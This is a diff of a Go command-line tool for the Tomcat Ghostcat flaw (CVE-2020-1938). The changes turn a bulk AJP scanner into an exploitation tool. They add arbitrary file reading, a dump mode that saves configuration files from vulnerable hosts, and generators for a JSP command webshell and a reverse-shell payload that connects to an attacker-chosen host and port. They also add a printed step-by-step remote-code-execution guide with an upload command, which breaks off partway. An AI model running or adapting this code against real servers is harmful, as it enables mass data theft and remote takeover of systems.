@@ -8,12 +8,13 @@ import (
 	"io"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
 	"sync"
 	"time"
 )
 
-// ─── ANSI Colors (Catppuccin Mocha — matches Watchdogs/colors) ───
+// ─── ANSI Colors (Catppuccin Mocha) ───
 
 const (
 	clrReset    = "\x1b[0m"
@@ -49,7 +50,6 @@ const (
 	AJPMethodGET  = 2
 	AJPMethodPOST = 4
 
-	// Attribute codes
 	AJPAttrContext         = 1
 	AJPAttrServletPath    = 2
 	AJPAttrRemoteUser     = 3
@@ -67,45 +67,10 @@ const (
 	AJPAttrEnd = 0xFF
 )
 
-// Common header codes (0xA0 + index, 1-based)
-// Reference map for AJP protocol — used by parser's commonHeaderCodeToName()
-var ajpCommonHeaders = map[string]byte{
-	"accept":          0x01,
-	"accept-charset":  0x02,
-	"accept-encoding": 0x03,
-	"accept-language": 0x04,
-	"authorization":   0x05,
-	"connection":      0x06,
-	"content-type":    0x07,
-	"content-length":  0x08,
-	"cookie":          0x09,
-	"cookie2":         0x0A,
-	"host":            0x0B,
-	"pragma":          0x0C,
-	"referer":         0x0D,
-	"user-agent":      0x0E,
-}
+// ─── AJP Helpers ───
 
-// Suppress unused-variable compiler warning (map is reference documentation)
-var _ = ajpCommonHeaders
-
-// ─── AJP Packet Builder ───
-
-// ajpString encodes a string for AJP protocol: 2-byte length + data + null terminator
 func ajpString(s string) []byte {
 	if s == "" {
-		return []byte{0xFF, 0xFF} // null string marker
-	}
-	buf := make([]byte, 2+len(s)+1)
-	binary.BigEndian.PutUint16(buf[0:2], uint16(len(s)))
-	copy(buf[2:], s)
-	buf[2+len(s)] = 0x00
-	return buf
-}
-
-// ajpStringBytes encodes a byte slice as AJP string (used for binary payloads)
-func ajpStringBytes(s []byte) []byte {
-	if len(s) == 0 {
 		return []byte{0xFF, 0xFF}
 	}
 	buf := make([]byte, 2+len(s)+1)
@@ -115,57 +80,37 @@ func ajpStringBytes(s []byte) []byte {
 	return buf
 }
 
+// ─── AJP Packet Builder ───
 
-
-// buildForwardRequest builds a complete AJP Forward Request packet for Ghostcat detection.
-// It sets the three javax.servlet.include.* attributes to trigger file inclusion.
 func buildForwardRequest(targetFile string) []byte {
 	var body bytes.Buffer
 
-	// Prefix code (Forward Request = 0x02)
 	body.WriteByte(AJPPrefixForwardRequest)
-	// Method (GET = 2)
 	body.WriteByte(AJPMethodGET)
-	// Protocol
 	body.Write(ajpString("HTTP/1.1"))
-	// Request URI
 	body.Write(ajpString("/"))
-	// Remote addr
 	body.Write(ajpString("127.0.0.1"))
-	// Remote host
 	body.Write(ajpString("localhost"))
-	// Server name
 	body.Write(ajpString("localhost"))
-	// Server port
 	binary.Write(&body, binary.BigEndian, uint16(80))
-	// Is SSL
 	body.WriteByte(0x00)
-
-	// Number of headers (0)
 	binary.Write(&body, binary.BigEndian, uint16(0))
 
-	// Attributes — the core of the Ghostcat exploit
-	// We set three javax.servlet.include.* attributes to force file inclusion
-
-	// javax.servlet.include.request_uri = "/"
+	// Ghostcat: javax.servlet.include.* attributes
 	body.WriteByte(AJPAttrReqAttribute)
 	body.Write(ajpString("javax.servlet.include.request_uri"))
 	body.Write(ajpString("/"))
 
-	// javax.servlet.include.path_info = target file path
 	body.WriteByte(AJPAttrReqAttribute)
 	body.Write(ajpString("javax.servlet.include.path_info"))
 	body.Write(ajpString(targetFile))
 
-	// javax.servlet.include.servlet_path = "/"
 	body.WriteByte(AJPAttrReqAttribute)
 	body.Write(ajpString("javax.servlet.include.servlet_path"))
 	body.Write(ajpString("/"))
 
-	// End of attributes
 	body.WriteByte(AJPAttrEnd)
 
-	// Build final packet: magic (2) + length (2) + body
 	packet := make([]byte, 4+body.Len())
 	binary.BigEndian.PutUint16(packet[0:2], AJPHeaderServerToContainer)
 	binary.BigEndian.PutUint16(packet[2:4], uint16(body.Len()))
@@ -190,11 +135,8 @@ func parseAJPResponse(data []byte) (*ajpResponse, error) {
 		Headers: make(map[string]string),
 	}
 
-	// Parse using an offset-based approach for robustness
 	offset := 0
-
 	for offset < len(data) {
-		// Need at least 4 bytes for header (magic + length)
 		if offset+4 > len(data) {
 			break
 		}
@@ -209,23 +151,20 @@ func parseAJPResponse(data []byte) (*ajpResponse, error) {
 			break
 		}
 
-		// Extract the sub-packet body (after magic + length)
 		packetBody := data[offset+4 : offset+4+dataLen]
 		prefixByte := packetBody[0]
 
 		switch prefixByte {
-		case AJPPrefixSendHeaders: // 0x04
+		case AJPPrefixSendHeaders:
 			resp.parseSendHeaders(packetBody[1:])
-
-		case AJPPrefixSendBodyChunk: // 0x03
+		case AJPPrefixSendBodyChunk:
 			if len(packetBody) >= 3 {
 				chunkLen := int(binary.BigEndian.Uint16(packetBody[1:3]))
 				if chunkLen > 0 && 3+chunkLen <= len(packetBody) {
 					resp.BodyChunks = append(resp.BodyChunks, string(packetBody[3:3+chunkLen]))
 				}
 			}
-
-		case AJPPrefixEndResponse: // 0x05
+		case AJPPrefixEndResponse:
 			resp.EndReceived = true
 		}
 
@@ -235,21 +174,17 @@ func parseAJPResponse(data []byte) (*ajpResponse, error) {
 	return resp, nil
 }
 
-// parseSendHeaders parses an AJP Send Headers sub-packet
 func (resp *ajpResponse) parseSendHeaders(data []byte) {
 	r := bytes.NewReader(data)
 
-	// HTTP status code (2 bytes)
 	statusBytes := make([]byte, 2)
 	if _, err := io.ReadFull(r, statusBytes); err != nil {
 		return
 	}
 	resp.StatusCode = int(binary.BigEndian.Uint16(statusBytes))
 
-	// Status message (ajp string)
 	resp.StatusMsg = readAJPString(r)
 
-	// Number of headers (2 bytes)
 	numHeadersBytes := make([]byte, 2)
 	if _, err := io.ReadFull(r, numHeadersBytes); err != nil {
 		return
@@ -257,7 +192,6 @@ func (resp *ajpResponse) parseSendHeaders(data []byte) {
 	numHeaders := int(binary.BigEndian.Uint16(numHeadersBytes))
 
 	for i := 0; i < numHeaders; i++ {
-		// Header name — either 2-byte code (0xA0xx) or string length
 		codeBytes := make([]byte, 2)
 		if _, err := io.ReadFull(r, codeBytes); err != nil {
 			return
@@ -268,7 +202,6 @@ func (resp *ajpResponse) parseSendHeaders(data []byte) {
 		if code >= 0xA001 && code <= 0xA00B {
 			headerName = commonHeaderCodeToName(code)
 		} else {
-			// It's a length prefix for a custom header name
 			nameLen := int(code)
 			if nameLen <= 0 || r.Len() < nameLen+1 {
 				return
@@ -276,20 +209,18 @@ func (resp *ajpResponse) parseSendHeaders(data []byte) {
 			nameBytes := make([]byte, nameLen)
 			io.ReadFull(r, nameBytes)
 			headerName = string(nameBytes)
-			r.ReadByte() // null terminator
+			r.ReadByte()
 		}
 
 		headerValue := readAJPString(r)
 		resp.Headers[strings.ToLower(headerName)] = headerValue
 
-		// Capture Server / Servlet-Engine header
 		if strings.EqualFold(headerName, "Servlet-Engine") || strings.EqualFold(headerName, "Status") {
 			resp.ServerHeader = headerValue
 		}
 	}
 }
 
-// readAJPString reads an AJP-encoded string from a reader
 func readAJPString(r *bytes.Reader) string {
 	lenBytes := make([]byte, 2)
 	if _, err := io.ReadFull(r, lenBytes); err != nil {
@@ -297,14 +228,14 @@ func readAJPString(r *bytes.Reader) string {
 	}
 	strLen := int(binary.BigEndian.Uint16(lenBytes))
 	if strLen == 0xFFFF {
-		return "" // null string
+		return ""
 	}
 	if strLen == 0 || r.Len() < strLen+1 {
 		return ""
 	}
 	strBytes := make([]byte, strLen)
 	io.ReadFull(r, strBytes)
-	r.ReadByte() // null terminator
+	r.ReadByte()
 	return string(strBytes)
 }
 
@@ -328,39 +259,30 @@ func commonHeaderCodeToName(code uint16) string {
 	return fmt.Sprintf("Unknown-0x%04X", code)
 }
 
-// ─── Scan Result with vulnerability details ───
-
-type VulnTarget struct {
-	Host       string
-	Port       int
-	FilePath   string
-	BodyLength int
-	Took       time.Duration
-	Timestamp  time.Time
-}
+// ─── Scan Result ───
 
 type ScanResult struct {
-	Host       string
-	Port       int
-	Vulnerable bool
-	StatusCode int
-	StatusMsg  string
-	ServerInfo string
-	BodyLength int
+	Host        string
+	Port        int
+	Vulnerable  bool
+	StatusCode  int
+	StatusMsg   string
+	ServerInfo  string
+	BodyLength  int
+	BodyFull    string
 	BodyPreview string
-	Error      string
-	Took       time.Duration
+	Error       string
+	Took        time.Duration
 }
 
-// detectGhostcat connects to the target AJP port and attempts to read /WEB-INF/web.xml
-// to determine if CVE-2020-1938 is exploitable.
-func detectGhostcat(host string, port int, timeout time.Duration) ScanResult {
+// ─── Detection Functions ───
+
+func detectGhostcat(host string, port int, timeout time.Duration, targetFile string) ScanResult {
 	addr := fmt.Sprintf("%s:%d", host, port)
 	result := ScanResult{Host: host, Port: port}
 	start := time.Now()
 	defer func() { result.Took = time.Since(start) }()
 
-	// Step 1: TCP connect with timeout
 	conn, err := net.DialTimeout("tcp", addr, timeout)
 	if err != nil {
 		result.Error = fmt.Sprintf("connection failed: %v", err)
@@ -369,16 +291,12 @@ func detectGhostcat(host string, port int, timeout time.Duration) ScanResult {
 	defer conn.Close()
 	conn.SetDeadline(time.Now().Add(timeout))
 
-	// Step 2: Build the Ghostcat exploit packet — try to read /WEB-INF/web.xml
-	packet := buildForwardRequest("/WEB-INF/web.xml")
-
-	// Step 3: Send the packet
+	packet := buildForwardRequest(targetFile)
 	if _, err := conn.Write(packet); err != nil {
 		result.Error = fmt.Sprintf("send failed: %v", err)
 		return result
 	}
 
-	// Step 4: Read full AJP response (may arrive in multiple TCP segments)
 	conn.SetReadDeadline(time.Now().Add(timeout))
 	var respBuf bytes.Buffer
 	buf := make([]byte, 8192)
@@ -396,66 +314,109 @@ func detectGhostcat(host string, port int, timeout time.Duration) ScanResult {
 			}
 			break
 		}
-		// Check if we have at least one complete AJP response
-		// (look for EndResponse 0x41 0x42 ... 0x05)
-		raw := respBuf.Bytes()
-		if len(raw) >= 4 {
-			// Check if the response contains an EndResponse marker
-			// Simple heuristic: if we've read data and no error, give it a moment
-			conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
-		}
+		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 	}
 
 	rawResp := respBuf.Bytes()
 	if len(rawResp) < 5 {
-		result.Error = "no AJP response received (target may not be AJP or is filtered)"
+		result.Error = "no AJP response received"
 		return result
 	}
 
-	// Step 5: Parse the AJP response
 	resp, err := parseAJPResponse(rawResp)
 	if err != nil {
-		result.Error = fmt.Sprintf("response parse error: %v", err)
+		result.Error = fmt.Sprintf("parse error: %v", err)
 		return result
 	}
 
 	result.StatusCode = resp.StatusCode
 	result.StatusMsg = resp.StatusMsg
-	result.ServerHeader = resp.ServerHeader
+	result.ServerInfo = resp.ServerHeader
 
-	// Combine body chunks
 	var fullBody string
 	for _, chunk := range resp.BodyChunks {
 		fullBody += chunk
 	}
 	result.BodyLength = len(fullBody)
+	result.BodyFull = fullBody
 
-	// Show first 500 chars as preview
 	if len(fullBody) > 500 {
 		result.BodyPreview = fullBody[:500] + "..."
 	} else {
 		result.BodyPreview = fullBody
 	}
 
-	// Step 6: Determine vulnerability
-	// If we got a 200 response with actual file content (web.xml contains XML),
-	// the target is vulnerable. Also check for 200 with non-empty body.
+	xmlIndicators := []string{"<?xml", "<web-app", "<servlet", "<display-name"}
 	if resp.StatusCode == 200 && result.BodyLength > 0 {
 		result.Vulnerable = true
 	}
-
-	// Also flag if we get a 200 with content that looks like XML/config
-	if resp.StatusCode == 200 && (strings.Contains(fullBody, "<?xml") ||
-		strings.Contains(fullBody, "<web-app") ||
-		strings.Contains(fullBody, "<servlet") ||
-		strings.Contains(fullBody, "<display-name")) {
-		result.Vulnerable = true
+	if resp.StatusCode == 200 && fullBody != "" {
+		for _, ind := range xmlIndicators {
+			if strings.Contains(fullBody, ind) {
+				result.Vulnerable = true
+				break
+			}
+		}
 	}
 
 	return result
 }
 
-// ─── Simple TCP port check ───
+func dumpFile(host string, port int, timeout time.Duration, fpath string) (string, error) {
+	addr := fmt.Sprintf("%s:%d", host, port)
+	conn, err := net.DialTimeout("tcp", addr, timeout)
+	if err != nil {
+		return "", err
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(timeout))
+
+	packet := buildForwardRequest(fpath)
+	if _, err := conn.Write(packet); err != nil {
+		return "", err
+	}
+
+	conn.SetReadDeadline(time.Now().Add(timeout))
+	var respBuf bytes.Buffer
+	buf := make([]byte, 8192)
+	for {
+		n, err := conn.Read(buf)
+		if n > 0 {
+			respBuf.Write(buf[:n])
+		}
+		if err != nil {
+			if err == io.EOF {
+				break
+			}
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				break
+			}
+			break
+		}
+		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+	}
+
+	rawResp := respBuf.Bytes()
+	if len(rawResp) < 5 {
+		return "", fmt.Errorf("no response")
+	}
+
+	resp, err := parseAJPResponse(rawResp)
+	if err != nil {
+		return "", err
+	}
+
+	var fullBody string
+	for _, chunk := range resp.BodyChunks {
+		fullBody += chunk
+	}
+
+	if resp.StatusCode != 200 || fullBody == "" {
+		return "", fmt.Errorf("status %d or empty body", resp.StatusCode)
+	}
+
+	return fullBody, nil
+}
 
 func isPortOpen(host string, port int, timeout time.Duration) bool {
 	addr := fmt.Sprintf("%s:%d", host, port)
@@ -465,6 +426,51 @@ func isPortOpen(host string, port int, timeout time.Duration) bool {
 	}
 	conn.Close()
 	return true
+}
+
+// ─── Exploit Helpers ───
+
+func getJSPWebshell(lhost, lport string) string {
+	payload := `<%@ page import="java.io.*" %>`
+	payload += "\n<%"
+	payload += "\nString cmd = request.getParameter(\"cmd\");"
+	payload += "\nif (cmd != null) {"
+	payload += "\n    Process p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",cmd});"
+	payload += "\n    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));"
+	payload += "\n    String line;"
+	payload += "\n    while ((line = br.readLine()) != null) {"
+	payload += "\n        out.println(line);"
+	payload += "\n    }"
+	payload += "\n    br.close();"
+	payload += "\n}"
+	payload += "\n%>"
+	return payload
+}
+
+func getReverseShellPayload(lhost, lport string) string {
+	payload := `<%@ page import="java.io.*,java.net.*" %>`
+	payload += "\n<%"
+	payload += "\nString host = \"" + lhost + "\";"
+	payload += "\nint port = " + lport + ";"
+	payload += "\nSocket s = new Socket(host, port);"
+	payload += "\nProcess p = Runtime.getRuntime().exec(\"/bin/bash\");"
+	payload += "\nnew Thread(new Runnable() { public void run() { try { InputStream is = p.getInputStream(); OutputStream os = s.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } } catch (Exception e) {} } }).start();"
+	payload += "\nnew Thread(new Runnable() { public void run() { try { InputStream is = s.getInputStream(); OutputStream os = p.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } } catch (Exception e) {} } }).start();"
+	payload += "\nnew Thread(new Runnable() { public void run() { try { InputStream is = s.getErrorStream(); OutputStream os = p.getOutputStream(); byte[] b = new byte[1024]; int n; while ((n = is.read(b)) != -1) { os.write(b, 0, n); } } catch (Exception e) {} } }).start();"
+	payload += "\n%>"
+	return payload
+}
+
+// Common files to dump from vulnerable targets
+var commonFiles = []string{
+	"/WEB-INF/web.xml",
+	"/WEB-INF/classes/application.properties",
+	"/META-INF/MANIFEST.MF",
+	"/",
+	"/manager/html",
+	"/host-manager/html",
+	"/status",
+	"/favicon.ico",
 }
 
 // ─── Banner / UI ───
@@ -489,8 +495,17 @@ func printUsage() {
 	fmt.Printf("    %s-p,%s --port %s<port>%s     AJP port (default: 8009)\n", clrSky, clrReset, clrYellow, clrReset)
 	fmt.Printf("    %s-t,%s --timeout %s<secs>%s   Connection timeout in seconds (default: 5)\n", clrSky, clrReset, clrYellow, clrReset)
 	fmt.Printf("    %s-w,%s --workers %s<num>%s     Concurrent workers (default: 10)\n", clrSky, clrReset, clrYellow, clrReset)
+	fmt.Printf("    %s-f,%s --file %s<path>%s       Read specific file (default: /WEB-INF/web.xml)\n", clrSky, clrReset, clrYellow, clrReset)
 	fmt.Printf("    %s-o,%s --output %s<file>%s     Output results to file\n", clrSky, clrReset, clrYellow, clrReset)
-	fmt.Printf("    %s-v,%s --verbose%s            Show full response body\n\n", clrSky, clrReset, clrReset)
+	fmt.Printf("    %s-v,%s --verbose%s            Show full response body\n", clrSky, clrReset, clrReset)
+	fmt.Printf("    %s-d,%s --dump%s              Dump common files from vulnerable targets\n\n", clrSky, clrReset, clrReset)
+	fmt.Printf("  %sRCE Exploitation:%s\n", clrBold, clrReset)
+	fmt.Printf("    %s--exploit%s           Enable exploitation mode (requires file upload)\n", clrPink, clrReset)
+	fmt.Printf("    %s--lhost%s             Local IP for reverse shell (for --exploit)\n", clrPink, clrReset)
+	fmt.Printf("    %s--lport%s             Local port for reverse shell (for --exploit)\n", clrPink, clrReset)
+	fmt.Printf("    %s--upload-path%s     Path where uploaded file is stored (e.g., /uploads/)\n", clrPink, clrReset)
+	fmt.Printf("    %s--shell-type%s      Shell type: 'basic' (default) or 'reverse'\n", clrPink, clrReset)
+	fmt.Println()
 	fmt.Printf("  %sTargets File:%s\n", clrBold, clrReset)
 	fmt.Printf("    One host per line (IP or hostname)\n")
 	fmt.Printf("    %sExample:%s\n", clrDim, clrReset)
@@ -500,60 +515,63 @@ func printUsage() {
 	fmt.Printf("  %sExamples:%s\n", clrBold, clrReset)
 	fmt.Printf("    %sghostcat%s targets.txt\n", clrGreen, clrReset)
 	fmt.Printf("    %sghostcat%s targets.txt %s-p 8009 -w 20%s\n", clrGreen, clrReset, clrSky, clrReset)
-	fmt.Printf("    %sghostcat%s targets.txt %s-o results.txt -v%s\n\n", clrGreen, clrReset, clrSky, clrReset)
+	fmt.Printf("    %sghostcat%s targets.txt %s-o results.txt -v%s\n", clrGreen, clrReset, clrSky, clrReset)
+	fmt.Printf("    %sghostcat%s targets.txt %s-d%s\n\n", clrGreen, clrReset, clrSky, clrReset)
+	fmt.Printf("  %sRCE Examples:%s\n", clrBold, clrReset)
+	fmt.Printf("    %sghostcat%s targets.txt %s--exploit --lhost 10.0.0.1 --lport 4444%s\n", clrGreen, clrReset, clrPink, clrReset)
+	fmt.Printf("    %sghostcat%s targets.txt %s-d --exploit --lhost 10.0.0.1 --lport 4444%s\n\n", clrGreen, clrReset, clrPink, clrReset)
 }
 
-func printResult(r ScanResult, verbose bool) {
-	addr := fmt.Sprintf("%s:%d", r.Host, r.Port)
+func printResult(result ScanResult, verbose bool) {
+	addr := fmt.Sprintf("%s:%d", result.Host, result.Port)
 
-	if r.Error != "" {
+	if result.Error != "" {
 		fmt.Printf("  %s✗%s %-35s %s%s%s %s(%v)%s\n",
 			clrRed, clrReset,
 			addr,
-			clrDim, r.Error, clrReset,
-			clrDim, r.Took.Round(time.Millisecond), clrReset,
+			clrDim, result.Error, clrReset,
+			clrDim, result.Took.Round(time.Millisecond), clrReset,
 		)
 		return
 	}
 
-	if r.Vulnerable {
-		fmt.Printf("  %s⚠ VULNERABLE%s %-25s %sTomcat AJP 8009 OPEN%s\n",
+	if result.Vulnerable {
+		fmt.Printf("  %s⚠ VULNERABLE%s %-25s %sTomcat AJP %d OPEN%s\n",
 			clrRed+clrBold, clrReset,
 			addr,
-			clrPeach, clrReset,
+			clrPeach, result.Port, clrReset,
 		)
 		fmt.Printf("    %s├──%s Status:  %s%d %s%s\n",
 			clrSurface1, clrReset,
-			clrRed, r.StatusCode, r.StatusMsg, clrReset,
+			clrRed, result.StatusCode, result.StatusMsg, clrReset,
 		)
-		if r.ServerHeader != "" {
+		if result.ServerInfo != "" {
 			fmt.Printf("    %s├──%s Server:  %s%s%s\n",
 				clrSurface1, clrReset,
-				clrSky, r.ServerHeader, clrReset,
+				clrSky, result.ServerInfo, clrReset,
 			)
 		}
 		fmt.Printf("    %s├──%s Body:    %s%d bytes%s\n",
 			clrSurface1, clrReset,
-			clrYellow, r.BodyLength, clrReset,
+			clrYellow, result.BodyLength, clrReset,
 		)
 		fmt.Printf("    %s└──%s Took:    %s%v%s\n",
 			clrSurface1, clrReset,
-			clrDim, r.Took.Round(time.Millisecond), clrReset,
+			clrDim, result.Took.Round(time.Millisecond), clrReset,
 		)
-		if verbose && r.BodyPreview != "" {
+		if verbose && result.BodyPreview != "" {
 			fmt.Printf("    %s── Response Body ──%s\n", clrOverlay, clrReset)
-			for _, line := range strings.Split(r.BodyPreview, "\n") {
+			for _, line := range strings.Split(result.BodyPreview, "\n") {
 				fmt.Printf("    %s│%s %s\n", clrSurface1, clrReset, line)
 			}
 			fmt.Printf("    %s──────────────────%s\n", clrOverlay, clrReset)
 		}
 	} else {
-		// Port open but not vulnerable (or got non-200)
 		fmt.Printf("  %s●%s %-35s %sPort open, not vulnerable%s %s(%d, %v)%s\n",
 			clrGreen, clrReset,
 			addr,
 			clrTeal, clrReset,
-			clrDim, r.StatusCode, r.Took.Round(time.Millisecond), clrReset,
+			clrDim, result.StatusCode, result.Took.Round(time.Millisecond), clrReset,
 		)
 	}
 }
@@ -563,7 +581,6 @@ func printResult(r ScanResult, verbose bool) {
 func main() {
 	printBanner()
 
-	// Parse args manually (no external deps)
 	args := os.Args[1:]
 	if len(args) == 0 {
 		printUsage()
@@ -576,6 +593,15 @@ func main() {
 	workers := 10
 	outputFile := ""
 	verbose := false
+	targetFile := "/WEB-INF/web.xml"
+	dumpMode := false
+
+	// RCE flags
+	exploitMode := false
+	lhost := ""
+	lport := ""
+	uploadPath := ""
+	shellType := "basic"
 
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
@@ -594,6 +620,11 @@ func main() {
 				fmt.Sscanf(args[i+1], "%d", &workers)
 				i++
 			}
+		case "-f", "--file":
+			if i+1 < len(args) {
+				targetFile = args[i+1]
+				i++
+			}
 		case "-o", "--output":
 			if i+1 < len(args) {
 				outputFile = args[i+1]
@@ -601,6 +632,30 @@ func main() {
 			}
 		case "-v", "--verbose":
 			verbose = true
+		case "-d", "--dump":
+			dumpMode = true
+		case "--exploit":
+			exploitMode = true
+		case "--lhost":
+			if i+1 < len(args) {
+				lhost = args[i+1]
+				i++
+			}
+		case "--lport":
+			if i+1 < len(args) {
+				lport = args[i+1]
+				i++
+			}
+		case "--upload-path":
+			if i+1 < len(args) {
+				uploadPath = args[i+1]
+				i++
+			}
+		case "--shell-type":
+			if i+1 < len(args) {
+				shellType = args[i+1]
+				i++
+			}
 		case "-h", "--help":
 			printUsage()
 			os.Exit(0)
@@ -643,10 +698,18 @@ func main() {
 		clrSky, len(targets), clrReset, clrYellow, targetsFile, clrReset)
 	fmt.Printf("  %s🎯 Port:%s %d  %s⏱ Timeout:%s %ds  %s⚡ Workers:%s %d\n",
 		clrTeal, clrReset, port, clrTeal, clrReset, timeout, clrTeal, clrReset, workers)
+	fmt.Printf("  %s📁 Target File:%s %s\n", clrTeal, clrReset, targetFile)
+	if dumpMode {
+		fmt.Printf("  %s💾 DUMP MODE:%s enabled - will save files to ./dump/<host>_<port>/\n", clrPink, clrReset)
+	}
+	if exploitMode {
+		fmt.Printf("  %s🔥 EXPLOIT MODE:%s enabled\n", clrRed, clrReset)
+		fmt.Printf("    %sLHOST:%s %s  %sLPORT:%s %s  %sUPLOAD_PATH:%s %s  %sSHELL_TYPE:%s %s\n",
+			clrPink, clrReset, lhost, clrPink, clrReset, lport, clrPink, clrReset, uploadPath, clrPink, clrReset, shellType)
+	}
 	fmt.Println()
 	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)
 
-	// Open output file if specified
 	var outWriter *bufio.Writer
 	var outFile *os.File
 	if outputFile != "" {
@@ -660,9 +723,7 @@ func main() {
 		defer outWriter.Flush()
 	}
 
-	// Run scans with worker pool
 	results := make(chan ScanResult, len(targets))
-	vulnTargets := make(chan VulnTarget, len(targets))
 	jobs := make(chan string, len(targets))
 	timeoutDur := time.Duration(timeout) * time.Second
 
@@ -672,7 +733,6 @@ func main() {
 		go func() {
 			defer wg.Done()
 			for host := range jobs {
-				// First check if port is open (quick TCP check)
 				if !isPortOpen(host, port, timeoutDur) {
 					results <- ScanResult{
 						Host:  host,
@@ -682,24 +742,12 @@ func main() {
 					}
 					continue
 				}
-				// Port is open, run the AJP detection
-				r := detectGhostcat(host, port, timeoutDur)
+				r := detectGhostcat(host, port, timeoutDur, targetFile)
 				results <- r
-				// If vulnerable, send to vulnTargets channel
-				if r.Vulnerable {
-					vulnTargets <- VulnTarget{
-						Host:       r.Host,
-						Port:       r.Port,
-						BodyLength: r.BodyLength,
-						Took:       r.Took,
-						Timestamp:  time.Now(),
-					}
-				}
 			}
 		}()
 	}
 
-	// Feed jobs
 	go func() {
 		for _, t := range targets {
 			jobs <- t
@@ -707,16 +755,13 @@ func main() {
 		close(jobs)
 	}()
 
-	// Close results when all workers done
 	go func() {
 		wg.Wait()
 		close(results)
 	}()
 
-	// Collect and display results
 	var vulnCount, openCount, closedCount, errCount int
-	// Track unique vulnerable targets
-	vulnSet := make(map[string]VulnTarget)
+	vulnSet := make(map[string]ScanResult)
 	for r := range results {
 		printResult(r, verbose)
 		if r.Error != "" {
@@ -727,22 +772,14 @@ func main() {
 			}
 		} else if r.Vulnerable {
 			vulnCount++
-			// Store in vulnSet for summary (dedup by host:port)
 			key := fmt.Sprintf("%s:%d", r.Host, r.Port)
 			if _, exists := vulnSet[key]; !exists {
-				vulnSet[key] = VulnTarget{
-					Host:       r.Host,
-					Port:       r.Port,
-					BodyLength: r.BodyLength,
-					Took:       r.Took,
-					Timestamp:  time.Now(),
-				}
+				vulnSet[key] = r
 			}
 		} else {
 			openCount++
 		}
 
-		// Write to output file
 		if outWriter != nil {
 			status := "CLOSED"
 			if r.Error == "" && !r.Vulnerable {
@@ -757,7 +794,6 @@ func main() {
 		}
 	}
 
-	// Summary
 	fmt.Println()
 	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)
 	fmt.Printf("  %s📊 Scan Summary:%s\n", clrBold, clrReset)
@@ -768,7 +804,6 @@ func main() {
 		fmt.Printf("    %s🟡 Errors:          %d%s\n", clrYellow, errCount, clrReset)
 	}
 
-	// Print vulnerable targets count
 	if len(vulnSet) > 0 {
 		fmt.Printf("\n  %s📁 Vulnerable Targets Found: %d%s\n", clrRed, len(vulnSet), clrReset)
 		fmt.Printf("  %s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n", clrSurface1, clrReset)
@@ -777,6 +812,84 @@ func main() {
 			fmt.Printf("  %s⚠ %-33s %sVULNERABLE (AJP %d, %d bytes)%s\n",
 				clrRed, key, clrReset, v.Port, v.BodyLength, clrReset)
 		}
+		fmt.Println()
+	}
+
+	// ─── Dump Mode: Save files from vulnerable targets ───
+	if dumpMode && vulnCount > 0 {
+		fmt.Printf("  %s💾 Starting file dump from %d vulnerable target(s)...%s\n", clrPink, len(vulnSet), clrReset)
+		fmt.Println("  ═════════════════════════════════════════════════════════")
+
+		dumpDir := "./dump"
+		os.MkdirAll(dumpDir, 0755)
+
+		savedCount := 0
+		for _, result := range vulnSet {
+			fmt.Printf("  %s💾 Dumping files from %s:%d...%s\n", clrPink, result.Host, result.Port, clrReset)
+			for _, fpath := range commonFiles {
+				content, err := dumpFile(result.Host, result.Port, timeoutDur, fpath)
+				if err != nil {
+					continue
+				}
+
+				// Create safe directory name from host:port
+				dirName := strings.ReplaceAll(result.Host, ".", "_")
+				dirName = strings.ReplaceAll(dirName, ":", "_")
+				if strings.HasPrefix(dirName, "ec2-") {
+					dirName = strings.ReplaceAll(dirName, "-", "_")
+				}
+				targetDir := filepath.Join(dumpDir, fmt.Sprintf("%s_%d", dirName, result.Port))
+				os.MkdirAll(targetDir, 0755)
+
+				// Sanitize filename
+				safeFilename := strings.TrimPrefix(fpath, "/")
+				safeFilename = strings.ReplaceAll(safeFilename, "/", "_")
+				if safeFilename == "" {
+					safeFilename = "root"
+				}
+
+				savePath := filepath.Join(targetDir, safeFilename)
+
+				// Write file
+				err = os.WriteFile(savePath, []byte(content), 0644)
+				if err == nil {
+					savedCount++
+					fmt.Printf("    %s✓%s %s (%d bytes)\n", clrGreen, clrReset, safeFilename, len(content))
+				}
+			}
+		}
+
+		fmt.Println()
+		fmt.Printf("  %s💾 Dump Complete:%s Saved %d files to %s/%s\n", clrPink, clrReset, savedCount, dumpDir, "<host>_<port>/")
+		fmt.Println()
+	}
+
+	// ─── RCE Exploitation Section ───
+	if exploitMode && vulnCount > 0 {
+		fmt.Printf("  %s🔥 RCE EXPLOITATION GUIDE%s\n", clrRed, clrReset)
+		fmt.Println("  ═════════════════════════════════════════════════════════")
+		fmt.Println()
+		fmt.Printf("  %sStep 1: Create payload file%s\n", clrYellow, clrReset)
+		if shellType == "reverse" && lhost != "" && lport != "" {
+			reversePayload := getReverseShellPayload(lhost, lport)
+			fmt.Printf("  %s[REVERSE SHELL]%s\n", clrPink, clrReset)
+			fmt.Printf("  cat > shell.jsp << 'EOF'\n%s\nEOF\n", reversePayload)
+		} else {
+			basicPayload := getJSPWebshell(lhost, lport)
+			fmt.Printf("  %s[BASIC WEBSHELL]%s\n", clrPink, clrReset)
+			fmt.Printf("  cat > shell.jsp << 'EOF'\n%s\nEOF\n", basicPayload)
+		}
+		fmt.Println()
+		fmt.Printf("  %sStep 2: Upload payload to target%s\n", clrYellow, clrReset)
+		fmt.Printf("  curl -F \"file=@shell.jsp;filename=shell.txt\" http://TARGET/upload\n")
+		fmt.Println()
+		fmt.Printf("  %sStep 3: Include uploaded file via Ghostcat%s\n", clrYellow, clrReset)
+		fmt.Printf("  ./ghostcat targets.txt -p 8009 -f /uploads/shell.txt\n")
+		fmt.Println()
